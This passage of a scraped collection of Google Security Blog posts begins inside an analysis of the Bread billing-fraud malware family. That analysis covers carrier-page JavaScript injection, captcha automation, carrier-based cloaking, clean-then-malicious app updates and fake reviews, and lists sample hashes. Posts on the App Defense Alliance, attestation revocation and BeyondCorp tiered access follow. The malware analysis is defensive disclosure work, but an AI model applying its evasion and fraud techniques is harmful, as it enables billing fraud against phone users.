WebView using addJavascriptInterface.     The value used to replace GET_IMG_OBJECT comes from the JSON configuration.      \"params\": \"document.getElementById('captcha')\"  The app then uses JavaScript injection to create a new script in the carrier’s web page to run the new function.     The base64-encoded image is then uploaded to an image recognition service. If the text is retrieved successfully, the app uses JavaScript injection again to submit the HTML form with the captcha answer.    CLOAKING  Client-side Carrier Checks In our basic command & control example above, we didn’t address the (incorrectly labeled) “imei” field.      {  \"button\": \"ยินดีต้อนรับ\",  \"code\": 0,  \"content\": \"F10\",  \"imei\": \"52003,52005,52000\",  \"rule\": \"Here are all the pictures you need, about                          happiness, beauty, beauty, etc., with our most                       sincere service, to provide you with the most                complete resources.\",  \"service\": \"4219245\" }  This contains the Mobile Country Code (MCC) and Mobile Network Code (MNC) values that the billing process will work for. In this example, the server response contains several values for Thai carriers. The app checks if the device’s network matches one of those provided by the server. If it does, it will commence with the billing process. If the value does not match, the app skips the “disclosure” page and billing process and brings the user straight to the app content.   In some versions, the server would only return valid responses several days after the apps were submitted.    Server-side Carrier Checks In the JavaScript bridge API obfuscation example covered above, the server supplied the app with the necessary strings to complete the billing process. However, analysts may not always see the indicators of compromise in the server’s response.   In this example, the requests to the server take the following form:      http://X.X.X.X/web?operator=52000&id=com.battery.fakepackage&deviceid=deadbeefdeadbeefdeadbeefdeadbeef  Here, the “operator” query parameter is the Mobile Country Code and Mobile Network Code . The server can use this information to determine if the user’s carrier is one of Bread’s targets. If not, the response is scrubbed of the strings used to complete the billing fraud.       ไปเดี๋ยวนี้         deadbeefdeadbeefdeadbeefdeadbeef                                         MISLEADING USERS Bread apps sometimes display a pop-up to the user that implies some form of compliance or disclosure, showing terms and conditions or a confirm button. However, the actual text would often only display a basic welcome message.     Translation: “This app is a place to be and it will feel like a superhero with this new app. We hope you enjoy it!”   Other versions included all the pieces needed for a valid disclosure message.     When translated the disclosure reads:   “Apply Car Racing Clip \\n Please enter your phone number for service details. \\n Terms and Conditions \\nFrom 9 Baht / day, you will receive 1 message / day. \\nPlease stop the V4 printing service at 4739504 \\n or call 02-697-9298 \\n Monday - Friday at 8.30 - 5.30pm \\n”   However, there are still two issues here:    The numbers to contact for cancelling the subscription are not real   The billing process commences even if you don’t hit the “Confirm” button   Even if the disclosure here displayed accurate information, the user would often find that the advertised functionality of the app did not match the actual content. Bread apps frequently contain no functionality beyond the billing process or simply clone content from other popular apps.    VERSIONING Bread has also leveraged an abuse tactic unique to app stores: versioning. Some apps have started with clean versions, in an attempt to grow user bases and build the developer accounts’ reputations. Only later is the malicious code introduced, through an update. Interestingly, early “clean” versions contain varying levels of signals that the updates will include malicious code later. Some are first uploaded with all the necessary code except the one line that actually initializes the billing process. Others may have the necessary permissions, but are missing the classes containing the fraud code. And others have all malicious content removed, except for log comments referencing the payment process. All of these methods attempt to space out the introduction of possible signals in various stages, testing for gaps in the publication process. However, GPP does not treat new apps and updates any differently from an analysis perspective.    FAKE REVIEWS When early versions of apps are first published, many five star reviews appear with comments like:      “So..good..”  “very beautiful”  Later, 1 star reviews from real users start appearing with comments like:  “Deception”  “The app is not honest …”   SUMMARY Sheer volume appears to be the preferred approach for Bread developers. At different times, we have seen three or more active variants using different approaches or targeting different carriers. Within each variant, the malicious code present in each sample may look nearly identical with only one evasion technique changed. Sample 1 may use AES-encrypted strings with reflection, while Sample 2 (submitted on the same day) will use the same code but with plaintext strings.  At peak times of activity, we have seen up to 23 different apps from this family submitted to Play in one day. At other times, Bread appears to abandon hope of making a variant successful and we see a gap of a week or longer before the next variant. This family showcases the amount of resources that malware authors now have to expend. Google Play Protect is constantly updating detection engines and warning users of malicious apps installed on their device.   SELECTED SAMPLES         Package Name        SHA-256 Digest            com.rabbit.artcamera        18c277c7953983f45f2fe6ab4c7d872b2794c256604e43500045cb2b2084103f            org.horoscope.astrology.predict        6f1a1dbeb5b28c80ddc51b77a83c7a27b045309c4f1bff48aaff7d79dfd4eb26            com.theforest.rotatemarswallpaper        4e78a26832a0d471922eb61231bc498463337fed8874db5f70b17dd06dcb9f09            com.jspany.temp        0ce78efa764ce1e7fb92c4de351ec1113f3e2ca4b2932feef46d7d62d6ae87f5            com.hua.ru.quan        780936deb27be5dceea20a5489014236796a74cc967a12e36cb56d9b8df9bc86            com.rongnea.udonood        8b2271938c524dd1064e74717b82e48b778e49e26b5ac2dae8856555b5489131            com.mbv.a.wp        01611e16f573da2c9dbc7acdd445d84bae71fecf2927753e341d8a5652b89a68            com.pho.nec.sg        b4822eeb71c83e4aab5ddfecfb58459e5c5e10d382a2364da1c42621f58e119b             ", "date": "January 9, 2020"},
{"website": "Google-Security", "title": "\nThe App Defense Alliance: Bringing the security industry together to fight bad apps\n", "author": ["Posted by Dave Kleidermacher, VP, Android Security & Privacy "], "link": "https://security.googleblog.com/2019/11/the-app-defense-alliance-bringing.html", "abstract": "                                   Posted by Dave Kleidermacher, VP, Android Security &amp; Privacy    Fighting against bad actors in the ecosystem is a top priority for Google, but we know there are others doing great work to find and protect against attacks. Our research partners in the mobile security world have built successful teams and technology, helping us in the fight. Today, we&#8217;re excited to take this collaboration to the next level, announcing a partnership between Google,  ESET ,  Lookout , and  Zimperium . It&#8217;s called the App Defense Alliance and together, we&#8217;re working to stop bad apps before they reach users&#8217; devices.    The Android ecosystem is thriving with over 2.5 billion devices, but this popularity also makes it an attractive target for abuse. This is true of all global platforms: where there is software with worldwide proliferation, there are bad actors trying to attack it for their gain. Working closely with our industry partners gives us an opportunity to collaborate with some truly talented researchers in our field and the detection engines they&#8217;ve built. This is all with the goal of, together, reducing the risk of app-based malware, identifying new threats, and protecting our users.    What will the App Defense Alliance do?    Our number one goal as partners is to ensure the safety of the Google Play Store, quickly finding potentially harmful applications and stopping them from being published   As part of this Alliance, we are integrating our Google Play Protect detection systems with each partner&#8217;s scanning engines. This will generate new app risk intelligence as apps are being queued to publish. Partners will analyze that dataset and act as another, vital set of eyes prior to an app going live on the Play Store.     Who are the partners?    All of our partners work in the world of endpoint protection, and offer specific products to protect mobile devices and the mobile ecosystem. Like Google Play Protect, our partners&#8217; technologies use a combination of machine learning and static/dynamic analysis to detect abusive behavior.  Multiple heuristic engines working in concert will increase our efficiency in identifying potentially harmful apps.   We hand-picked these partners based on their successes in finding potential threats and their dedication to improving the ecosystem. These partners are regularly recognized in analyst reports for their work.    Industry collaboration is key    Knowledge sharing and industry collaboration are important aspects in securing the world from attacks. We believe working together is the ultimate way we will get ahead of bad actors. We&#8217;re excited to work with these partners to arm the Google Play Store against bad apps.    Want to learn more about the App Defense Alliance&#8217;s work? Visit us  here .                                      Posted by Dave Kleidermacher, VP, Android Security & Privacy  Fighting against bad actors in the ecosystem is a top priority for Google, but we know there are others doing great work to find and protect against attacks. Our research partners in the mobile security world have built successful teams and technology, helping us in the fight. Today, we’re excited to take this collaboration to the next level, announcing a partnership between Google, ESET, Lookout, and Zimperium. It’s called the App Defense Alliance and together, we’re working to stop bad apps before they reach users’ devices.   The Android ecosystem is thriving with over 2.5 billion devices, but this popularity also makes it an attractive target for abuse. This is true of all global platforms: where there is software with worldwide proliferation, there are bad actors trying to attack it for their gain. Working closely with our industry partners gives us an opportunity to collaborate with some truly talented researchers in our field and the detection engines they’ve built. This is all with the goal of, together, reducing the risk of app-based malware, identifying new threats, and protecting our users.  What will the App Defense Alliance do?  Our number one goal as partners is to ensure the safety of the Google Play Store, quickly finding potentially harmful applications and stopping them from being published  As part of this Alliance, we are integrating our Google Play Protect detection systems with each partner’s scanning engines. This will generate new app risk intelligence as apps are being queued to publish. Partners will analyze that dataset and act as another, vital set of eyes prior to an app going live on the Play Store.   Who are the partners?  All of our partners work in the world of endpoint protection, and offer specific products to protect mobile devices and the mobile ecosystem. Like Google Play Protect, our partners’ technologies use a combination of machine learning and static/dynamic analysis to detect abusive behavior.  Multiple heuristic engines working in concert will increase our efficiency in identifying potentially harmful apps.  We hand-picked these partners based on their successes in finding potential threats and their dedication to improving the ecosystem. These partners are regularly recognized in analyst reports for their work.  Industry collaboration is key  Knowledge sharing and industry collaboration are important aspects in securing the world from attacks. We believe working together is the ultimate way we will get ahead of bad actors. We’re excited to work with these partners to arm the Google Play Store against bad apps.   Want to learn more about the App Defense Alliance’s work? Visit us here.      ", "date": "November 6, 2019"},
{"website": "Google-Security", "title": "\n Trust but verify attestation with revocation\n", "author": [], "link": "https://security.googleblog.com/2019/09/trust-but-verify-attestation-with.html", "abstract": "                                 Posted by Rob Barnes &amp; Shawn Willden, Android Security &amp; Privacy Team     [Cross-posted from the  Android Developers Blog ]            Billions of people rely on their Android-powered devices to securely store their sensitive information. A vital component of the Android security stack is the  key attestation system . Android devices since Android 7.0 are able to generate an attestation certificate that attests to the security properties of the device&#8217;s hardware and software. OEMs producing devices with Android 8.0 or higher must install a batch attestation key provided by Google on each device at the time of manufacturing.   These keys might need to be revoked for a number of reasons including accidental disclosure, mishandling, or suspected extraction by an attacker. When this occurs, the affected keys must be immediately revoked to protect users. The security of any Public-Key Infrastructure system depends on the robustness of the key revocation process.    All of the attestation keys issued so far include an extension that embeds a certificate revocation list (CRL) URL in the certificate. We found that the CRL (and online certificate status protocol) system was not flexible enough for our needs. So we set out to replace the revocation system for Android attestation keys with something that is flexible and simple to maintain and use.   Our solution is a single TLS-secured URL ( https://android.googleapis.com/attestation/status ) that returns a list containing all revoked Android attestation keys. This list is encoded in JSON and follows a strict  format  defined by JSON schema. Only keys that have non-valid status appear in the list, so it is not an exhaustive list of all issued keys.   This system allows us to express more nuance about the status of a key and the reason for the status. A key can have a status of  REVOKED  or  SUSPENDED , where revoked is permanent and suspended is temporary. The reason for the status is described as either  KEY_COMPROMISE ,  CA_COMPROMISE ,  SUPERSEDED , or  SOFTWARE_FLAW.  A complete, up-to-date list of statuses and reasons can be found in the  developer documentation .   The CRL URLs embedded in existing batch certificates will continue to operate. Going forward, attestation batch certificates will no longer contain a CRL extension. The status of these legacy certificates will also be included in the attestation status list, so developers can safely switch to using the attestation status list for both current and legacy certificates. An example of how to correctly verify Android attestation keys is included in the  Key Attestation sample .                                       Posted by Rob Barnes & Shawn Willden, Android Security & Privacy Team  [Cross-posted from the Android Developers Blog]    Billions of people rely on their Android-powered devices to securely store their sensitive information. A vital component of the Android security stack is the key attestation system. Android devices since Android 7.0 are able to generate an attestation certificate that attests to the security properties of the device’s hardware and software. OEMs producing devices with Android 8.0 or higher must install a batch attestation key provided by Google on each device at the time of manufacturing.  These keys might need to be revoked for a number of reasons including accidental disclosure, mishandling, or suspected extraction by an attacker. When this occurs, the affected keys must be immediately revoked to protect users. The security of any Public-Key Infrastructure system depends on the robustness of the key revocation process.   All of the attestation keys issued so far include an extension that embeds a certificate revocation list (CRL) URL in the certificate. We found that the CRL (and online certificate status protocol) system was not flexible enough for our needs. So we set out to replace the revocation system for Android attestation keys with something that is flexible and simple to maintain and use.  Our solution is a single TLS-secured URL (https://android.googleapis.com/attestation/status) that returns a list containing all revoked Android attestation keys. This list is encoded in JSON and follows a strict format defined by JSON schema. Only keys that have non-valid status appear in the list, so it is not an exhaustive list of all issued keys.  This system allows us to express more nuance about the status of a key and the reason for the status. A key can have a status of REVOKED or SUSPENDED, where revoked is permanent and suspended is temporary. The reason for the status is described as either KEY_COMPROMISE, CA_COMPROMISE, SUPERSEDED, or SOFTWARE_FLAW. A complete, up-to-date list of statuses and reasons can be found in the developer documentation.  The CRL URLs embedded in existing batch certificates will continue to operate. Going forward, attestation batch certificates will no longer contain a CRL extension. The status of these legacy certificates will also be included in the attestation status list, so developers can safely switch to using the attestation status list for both current and legacy certificates. An example of how to correctly verify Android attestation keys is included in the Key Attestation sample.     ", "date": "September 6, 2019"},
{"website": "Google-Security", "title": "\nHow Google adopted BeyondCorp: Part 3 (tiered access)\n", "author": ["Posted by Daniel Ladenheim, Software Engineer, and Hunter King, Security Engineer "], "link": "https://security.googleblog.com/2019/09/how-google-adopted-beyondcorp-part-3.html", "abstract": "                             Posted by Daniel Ladenheim, Software Engineer, and Hunter King, Security Engineer&nbsp;        Intro&nbsp;             This is the third post in a series of four, in which we set out to revisit various  BeyondCorp  topics and share lessons that were learnt along the internal implementation path at Google.         The  first post  in this series focused on providing necessary context for how Google adopted BeyondCorp, Google&#8217;s implementation of the zero trust security model. The  second post  focused on managing devices - how we decide whether or not a device should be trusted and why that distinction is necessary. This post introduces the concept of tiered access, its importance, how we implemented it, and how we addressed associated troubleshooting challenges.                     High level architecture for BeyondCorp              What is Tiered Access?         In a traditional client certificate system, certificates are only given to trusted devices. Google used this approach initially as it dramatically simplified device trust. With such a system, any device with a valid certificate can be trusted. At predefined intervals, clients prove they can be trusted and a new certificate is issued. It&#8217;s typically a lightweight process and many off-the-shelf products exist to implement flows that adhere to this principle.       However, there are a number of challenges with this setup:     Not all devices need the same level of security hardening (e.g. non-standard issue devices, older platforms required for testing, BYOD, etc.).   These systems don&#8217;t easily allow for nuanced access based on shifting security posture.   These systems tend to evaluate a device based on a single set of criteria, regardless of whether devices require access to highly sensitive data (e.g. corporate financials) or far less sensitive data (e.g. a dashboard displayed in a public space).    The next challenge introduced by traditional systems is the inherent requirement that a device must meet your security requirements before it can get a certificate. This sounds reasonable on paper, but it unfortunately means that existing certificate infrastructure can&#8217;t be used to aid device provisioning. This implies you must have an additional infrastructure to bootstrap a device into a trusted state.       The most significant challenge is the large amount of time in between trust evaluations. If you only install a new certificate once a year, this means it might take an entire year before you are able to recertify a device. Therefore, any new requirements you wish to add to the fleet may take up to a year before they are fully in effect. On the other hand, if you require certificates to be installed monthly or daily, you have placed a significant burden on your users and/or support staff, as they are forced to go through the certification issuance process far more often, which can be time consuming and frustrating. Additionally, if a device is found to be out of compliance with security policy, the only option is to remove all access by revoking the certificate, rather than degrading access, which can create a frustrating all-or-nothing situation for the user.    Tiered access attempts to address all these challenges, which is why we decided to adopt it. In this new model, certificates are simply used to provide the device&#8217;s identity, instead of acting as proof of trust. Trust decisions are then made by a separate system which can be modified without interfering with the certificate issuance process or validity. Moving the trust evaluation out-of-band from the certificate issuance allows us to circumvent the challenges identified above in the traditional system. Below are three ways in which tiered access helps address these concerns.         Different access levels for different security states      By separating trust from identity, we can define infinite levels of trust, if we so desired. At any point in time, we can define a new trust level, or adjust existing trust level requirements, and reevaluate a device's compliance. This is the heart of the tiered access system. It provides us the flexibility to define different device trust criteria for low sensitivity applications from those used for high trusted applications.          Solving the bootstrapping challenge           Multiple trust states enable us to use the system to initiate an OS installation. We can now allow access to bootstrapping (configuration and patch management) services based solely on whether we own the device. This enables provisioning to occur from untrusted networks allowing us to replace the traditional IP-based checks.       Configurable frequency of trust evaluations        The frequency of device trust evaluation is independent from certificate issuance in a tiered access setup. This means you can evaluate trust as often as you feel necessary. Changes to trust definitions can be immediately reflected across the entire fleet. Changes to device posture can similarly immediately impact trust.    We should note that the system&#8217;s ability to quickly remove trust from devices can be a double edged sword. If there are bugs in the trust definitions or evaluations themselves, this can also quickly remove trust from &#8216;good&#8217; devices. You must have the ability to adequately test policy changes to mitigate the blast radius from these types of bugs, and ideally canary changes to subsets of the fleet for a baking period. Constant monitoring is also critical. A bug in your trust evaluation system could cause it to start mis-evaluating trust. It&#8217;s wise to add alarms if the system starts dropping (or raising) the trust of too many machines at once. The troubleshooting section below provides additional techniques to help minimize the impact of misconfigured trust logic.           How did we define access tiers?      The basic concept of tiers is relatively straightforward: access to data increases as the device security hardening increases. These tiers are useful for coarse grain access control of client devices, which we have found to be sufficient in most cases. At Google, we allow the user to choose the device tier that allows them to weigh access needs with security requirements and policy. If a user needs access to more corporate data, they may have to accept more device configuration restrictions. If a user wants more control over their device and less restrictions but don&#8217;t need access to higher risk resources, they can choose a tier with less access to corporate data. For more information about the properties of a trusted platform you can measure, visit our paper about  Maintaining a Healthy Fleet .    We knew this model would work in principle, but we didn&#8217;t know how many access tiers we should define. As described above, the old model only had two tiers: Trusted and Untrusted. We knew we wanted more than that to enable trust build up at the very least, but we didn&#8217;t know the ideal number. More tiers allow access control lists to be specified with greater fidelity at the cost of confusion for service owners, security engineers, and the wider employee base alike.    At Google, we initially supported four distinct tiers ranging from Untrusted to Highly-Privileged Access. The extremes are easy to understand: Untrusted devices should only access data that is already public while Highly-Privileged Access devices have greater privilege internally. The middle two tiers allowed system owners to design their systems with the tiered access model in mind. Certain sensitive actions required a Highly-Privileged Access device while less sensitive portions of the system could be reached with less trusted devices. This degraded access model sounded great to us security wonks. Unfortunately, employees were unable to determine what tier they should choose to ensure they could access all the systems they needed. In the end, we determined that the extra middle tier led to intense confusion without much benefit.    In our current model, the vast majority of devices fit in one of three distinct tiers: Untrusted, Basic Access, and Highly-Privileged Access. In this model, system owners are required to choose the more trusted path if their system is more sensitive. This requirement does limit the finesse of the system but greatly reduces employee confusion and was key to a successful adoption.     In addition to tiers, our system is able to provide additional context to access gateways and underlying applications and services. This additional information is useful to provide finer grained, device-based access control. Imposing additional device restrictions on highly sensitive systems, in addition to checking the coarse grain tier, is a reasonable way to balance security vs user expectations. Because highly sensitive systems are only used by a smaller subset of the employee population, based on role and need, these additional restrictions typically aren&#8217;t a source of user confusion. With that in mind, please note that this article only covers device-based controls and does not address fine-grained controls based on a user&#8217;s identity.    At the other end of the spectrum, we have OS installation/remediation services. These systems are required in order to support bootstrapping a device which by design does not yet adhere to the Basic Access tier. As described earlier, we use our certificates as a device identity, not trust validation. In the OS installation case, no reported data exists, but we can make access decisions based on the inventory data associated with that device identity. This allows us to ensure our OS and security agents are only installed on devices we own and expect to be in use. Once the OS and security agents are up and running, we can use them to lock down the device and prove it is in a state worthy of more trust.        How did we create rules to implement the tiers?     Device-based data is the heart of BeyondCorp and tiered access. We evaluate trust tiers using data about each device at Google to determine its security integrity and tier level. To obtain this data, we built an inventory pipeline which aggregates data from various sources of authority within our enterprise to obtain a holistic, comprehensive view of a device's security posture. For example, we gather prescribed company asset inventory in one service and observed data reported by agents on the devices in other services. All of this data is used to determine which tier a device belongs in, and trust tiers are reevaluated every time corporate data is changed or new data is reported.    Trust level evaluations are made via \"rules\", written by security and systems engineers. For example, for a device to have basic access, we have a rule that checks that it is running an approved operating system build and version. For that same device to have highly-privileged access, it would need to pass several additional rules, such as checking the device is encrypted and contains the latest security patches. Rules exist in a hierarchical structure, so several rules can combine to create a tier. Requirements for tiers across device platforms can be different, so there is a separate hierarchy for each. Security engineers work closely with systems engineers to determine the necessary information to protect devices, such as determining thresholds for required minimum version and security patch frequency.             Rule Enforcement and User Experience      To create a good user experience, rules are created and monitored before being enforced. For example, before requiring all users to upgrade their Chrome browser, we monitor how many users will drop trust if that rule was enforced. Dashboards track rule impact on Googlers over 30 day periods. This enables security and systems teams to evaluate rule change impact before they affect end users.     To further protect employee experience, we have measures called grace periods and exceptions. Grace periods provide windows of a predefined duration where devices can violate rules but still maintain trust and access, providing a fallback in case of unexpected consequences. Furthermore, grace periods can be implemented quickly and easily across the fleet in case for disaster recovery purposes. The other mechanism is called exceptions. Exceptions allow rule authors to create rules for the majority while enabling security engineers to make nuanced decisions around individual riskier processes. For example, if we have a team of Android developers specializing on user experience for an older Android version, they may be granted an exception for the minimum version rule.         How did we simplify troubleshooting?        Troubleshooting access issues proves challenging in a system where many pieces of data interact to create trust. We tackle this issue in two ways. First, we have a system to provide succinct and actionable explanations to end users on how to resolve problems on their own. Second, we have the capability to notify users when their devices have lost trust or are about to lose trust. The combination of these efforts improves the user experience of the tiered access solution and reduces toil for those supporting it.    We are able to provide self-service feedback to users by closely integrating the creation of rule policy with resolution steps for that policy. In other words, security engineers who write rule policies are also responsible for attaching steps on how to resolve the issue. To further aid users, the rule evaluation system provides details about the specific pieces of data causing the failure. All this information is fed into a centralized system that generates user-friendly explanations, guiding users to self-diagnose and fix problems without the need for IT support. Likewise, a tech may not be able to see pieces of PII about a user when helping fix the device. These cases are rare but necessary to protect the parties involved in these scenarios. Having one centralized debugging system helps deal with all these nuances, enabling us to provide detailed and safe explanations to end users in accordance with their needs.    Remediation steps are communicated to users in several ways. Before a device loses trust, notification pop-ups appear to the user explaining that a loss of access is imminent. These pop-ups contain directions to the remediation system so the user can self-diagnose and fix the problem. This circumvents user pain by offering solutions before the problem impacts the user. Premeditated notifications work in conjunction with the aforementioned grace periods, as we provide a window in which users can fix their devices. If the issue is not fixed and the device goes out of compliance, there is still a clear path on what to do. For example, when a user attempts to access a resource for which they do not have permission, a link appears on the access denied page directing them to the relevant remediation steps. This provides fast, clear feedback on how to fix their device and reduces toil on the IT support teams.           Next time   In the next and final post in this series, we will discuss how we migrated services to be protected by the BeyondCorp architecture at Google.  In the meantime, if you want to learn more, you can check out the  BeyondCorp research papers . In addition, getting started with BeyondCorp is now easier using zero trust solutions from  Google Cloud (context-aware access)  and other enterprise providers.         Thank you to the editors of the BeyondCorp blog post series, Puneet Goel (Product Manager), Lior Tishbi (Program Manager), and Justin McWilliams (Engineering Manager).                                                     Posted by Daniel Ladenheim, Software Engineer, and Hunter King, Security Engineer    Intro     This is the third post in a series of four, in which we set out to revisit various BeyondCorp topics and share lessons that were learnt along the internal implementation path at Google.   The first post in this series focused on providing necessary context for how Google adopted BeyondCorp, Google’s implementation of the zero trust security model. The second post focused on managing devices - how we decide whether or not a device should be trusted and why that distinction is necessary. This post introduces the concept of tiered access, its importance, how we implemented it, and how we addressed associated troubleshooting challenges.      High level architecture for BeyondCorp    What is Tiered Access?   In a traditional client certificate system, certificates are only given to trusted devices. Google used this approach initially as it dramatically simplified device trust. With such a system, any device with a valid certificate can be trusted. At predefined intervals, clients prove they can be trusted and a new certificate is issued. It’s typically a lightweight process and many off-the-shelf products exist to implement flows that adhere to this principle.  However, there are a number of challenges with this setup:  Not all devices need the same level of security hardening (e.g. non-standard issue devices, older platforms required for testing, BYOD, etc.). These systems don’t easily allow for nuanced access based on shifting security posture. These systems tend to evaluate a device based on a single set of criteria, regardless of whether devices require access to highly sensitive data (e.g. corporate financials) or far less sensitive data (e.g. a dashboard displayed in a public space).  The next challenge introduced by traditional systems is the inherent requirement that a device must meet your security requirements before it can get a certificate. This sounds reasonable on paper, but it unfortunately means that existing certificate infrastructure can’t be used to aid device provisioning. This implies you must have an additional infrastructure to bootstrap a device into a trusted state.   The most significant challenge is the large amount of time in between trust evaluations. If you only install a new certificate once a year, this means it might take an entire year before you are able to recertify a device. Therefore, any new requirements you wish to add to the fleet may take up to a year before they are fully in effect. On the other hand, if you require certificates to be installed monthly or daily, you have placed a significant burden on your users and/or support staff, as they are forced to go through the certification issuance process far more often, which can be time consuming and frustrating. Additionally, if a device is found to be out of compliance with security policy, the only option is to remove all access by revoking the certificate, rather than degrading access, which can create a frustrating all-or-nothing situation for the user.  Tiered access attempts to address all these challenges, which is why we decided to adopt it. In this new model, certificates are simply used to provide the device’s identity, instead of acting as proof of trust. Trust decisions are then made by a separate system which can be modified without interfering with the certificate issuance process or validity. Moving the trust evaluation out-of-band from the certificate issuance allows us to circumvent the challenges identified above in the traditional system. Below are three ways in which tiered access helps address these concerns.   Different access levels for different security states  By separating trust from identity, we can define infinite levels of trust, if we so desired. At any point in time, we can define a new trust level, or adjust existing trust level requirements, and reevaluate a device's compliance. This is the heart of the tiered access system. It provides us the flexibility to define different device trust criteria for low sensitivity applications from those used for high trusted applications.    Solving the bootstrapping challenge    Multiple trust states enable us to use the system to initiate an OS installation. We can now allow access to bootstrapping (configuration and patch management) services based solely on whether we own the device. This enables provisioning to occur from untrusted networks allowing us to replace the traditional IP-based checks.  Configurable frequency of trust evaluations   The frequency of device trust evaluation is independent from certificate issuance in a tiered access setup. This means you can evaluate trust as often as you feel necessary. Changes to trust definitions can be immediately reflected across the entire fleet. Changes to device posture can similarly immediately impact trust.  We should note that the system’s ability to quickly remove trust from devices can be a double edged sword. If there are bugs in the trust definitions or evaluations themselves, this can also quickly remove trust from ‘good’ devices. You must have the ability to adequately test policy changes to mitigate the blast radius from these types of bugs, and ideally canary changes to subsets of the fleet for a baking period. Constant monitoring is also critical. A bug in your trust evaluation system could cause it to start mis-evaluating trust. It’s wise to add alarms if the system starts dropping (or raising) the trust of too many machines at once. The troubleshooting section below provides additional techniques to help minimize the impact of misconfigured trust logic.    How did we define access tiers?  The basic concept of tiers is relatively straightforward: access to data increases as the device security hardening increases. These tiers are useful for coarse grain access control of client devices, which we have found to be sufficient in most cases. At Google, we allow the user to choose the device tier that allows them to weigh access needs with security requirements and policy. If a user needs access to more corporate data, they may have to accept more device configuration restrictions. If a user wants more control over their device and less restrictions but don’t need access to higher risk resources, they can choose a tier with less access to corporate data. For more information about the properties of a trusted platform you can measure, visit our paper about Maintaining a Healthy Fleet.  We knew this model would work in principle, but we didn’t know how many access tiers we should define. As described above, the old model only had two tiers: Trusted and Untrusted. We knew we wanted more than that to enable trust build up at the very least, but we didn’t know the ideal number. More tiers allow access control lists to be specified with greater fidelity at the cost of confusion for service owners, security engineers, and the wider employee base alike.  At Google, we initially supported four distinct tiers ranging from Untrusted to Highly-Privileged Access. The extremes are easy to understand: Untrusted devices should only access data that is already public while Highly-Privileged Access devices have greater privilege internally. The middle two tiers allowed system owners to design their systems with the tiered access model in mind. Certain sensitive actions required a Highly-Privileged Access device while less sensitive portions of the system could be reached with less trusted devices. This degraded access model sounded great to us security wonks. Unfortunately, employees were unable to determine what tier they should choose to ensure they could access all the systems they needed. In the end, we determined that the extra middle tier led to intense confusion without much benefit.  In our current model, the vast majority of devices fit in one of three distinct tiers: Untrusted, Basic Access, and Highly-Privileged Access. In this model, system owners are required to choose the more trusted path if their system is more sensitive. This requirement does limit the finesse of the system but greatly reduces employee confusion and was key to a successful adoption.   In addition to tiers, our system is able to provide additional context to access gateways and underlying applications and services. This additional information is useful to provide finer grained, device-based access control. Imposing additional device restrictions on highly sensitive systems, in addition to checking the coarse grain tier, is a reasonable way to balance security vs user expectations. Because highly sensitive systems are only used by a smaller subset of the employee population, based on role and need, these additional restrictions typically aren’t a source of user confusion. With that in mind, please note that this article only covers device-based controls and does not address fine-grained controls based on a user’s identity.  At the other end of the spectrum, we have OS installation/remediation services. These systems are required in order to support bootstrapping a device which by design does not yet adhere to the Basic Access tier. As described earlier, we use our certificates as a device identity, not trust validation. In the OS installation case, no reported data exists, but we can make access decisions based on the inventory data associated with that device identity. This allows us to ensure our OS and security agents are only installed on devices we own and expect to be in use. Once the OS and security agents are up and running, we can use them to lock down the device and prove it is in a state worthy of more trust.   How did we create rules to implement the tiers?  Device-based data is the heart of BeyondCorp and tiered access. We evaluate trust tiers using data about each device at Google to determine its security integrity and tier level. To obtain this data, we built an inventory pipeline which aggregates data from various sources of authority within our enterprise to obtain a holistic, comprehensive view of a device's security posture. For example, we gather prescribed company asset inventory in one service and observed data reported by agents on the devices in other services. All of this data is used to determine which tier a device belongs in, and trust tiers are reevaluated every time corporate data is changed or new data is reported.  Trust level evaluations are made via \"rules\", written by security and systems engineers. For example, for a device to have basic access, we have a rule that checks that it is running an approved operating system build and version. For that same device to have highly-privileged access, it would need to pass several additional rules, such as checking the device is encrypted and contains the latest security patches. Rules exist in a hierarchical structure, so several rules can combine to create a tier. Requirements for tiers across device platforms can be different, so there is a separate hierarchy for each. Security engineers work closely with systems engineers to determine the necessary information to protect devices, such as determining thresholds for required minimum version and security patch frequency.   Rule Enforcement and User Experience  To create a good user experience, rules are created and monitored before being enforced. For example, before requiring all users to upgrade their Chrome browser, we monitor how many users will drop trust if that rule was enforced. Dashboards track rule impact on Googlers over 30 day periods. This enables security and systems teams to evaluate rule change impact before they affect end users.   To further protect employee experience, we have measures called grace periods and exceptions. Grace periods provide windows of a predefined duration where devices can violate rules but still maintain trust and access, providing a fallback in case of unexpected consequences. Furthermore, grace periods can be implemented quickly and easily across the fleet in case for disaster recovery purposes. The other mechanism is called exceptions. Exceptions allow rule authors to create rules for the majority while enabling security engineers to make nuanced decisions around individual riskier processes. For example, if we have a team of Android developers specializing on user experience for an older Android version, they may be granted an exception for the minimum version rule.    How did we simplify troubleshooting?   Troubleshooting access issues proves challenging in a system where many pieces of data interact to create trust. We tackle this issue in two ways. First, we have a system to provide succinct and actionable explanations to end users on how to resolve problems on their own. Second, we have the capability to notify users when their devices have lost trust or are about to lose trust. The combination of these efforts improves the user experience of the tiered access solution and reduces toil for those supporting it.  We are able to provide self-service feedback to users by closely integrating the creation of rule policy with resolution steps for that policy. In other words, security engineers who write rule policies are also responsible for attaching steps on how to resolve the issue. To further aid users, the rule evaluation system provides details about the specific pieces of data causing the failure. All this information is fed into a centralized system that generates user-friendly explanations, guiding users to self-diagnose and fix problems without the need for IT support. Likewise, a tech may not be able to see pieces of PII about a user when helping fix the device. These cases are rare but necessary to protect the parties involved in these scenarios. Having one centralized debugging system helps deal with all these nuances, enabling us to provide detailed and safe explanations to end users in accordance with their needs.  Remediation steps are communicated to users in several ways. Before a device loses trust, notification pop-ups appear to the user explaining that a loss of access is imminent. These pop-ups contain directions to the remediation system so the user can self-diagnose and fix the problem. This circumvents user pain by offering solutions before the problem impacts the user. Premeditated notifications work in conjunction with the aforementioned grace periods, as we provide a window in which users can fix their devices. If the issue is not fixed and the device goes out of compliance, there is still a clear path on what to do. For example, when a user attempts to access a resource for which they do not have permission, a link appears on the access denied page directing them to the relevant remediation steps. This provides fast, clear feedback on how to fix their device and reduces toil on the IT support teams.    Next timeIn the next and final post in this series, we will discuss how we migrated services to be protected by the BeyondCorp architecture at Google.In the meantime, if you want to learn more, you can check out the BeyondCorp research papers. In addition, getting started with BeyondCorp is now easier using zero trust solutions from Google Cloud (context-aware access) and other enterprise providers.   Thank you to the editors of the BeyondCorp blog post series, Puneet Goel (Product Manager), Lior Tishbi (Program Manager), and Justin McWilliams (Engineering Manager).          ", "date": "September 17, 2019"},
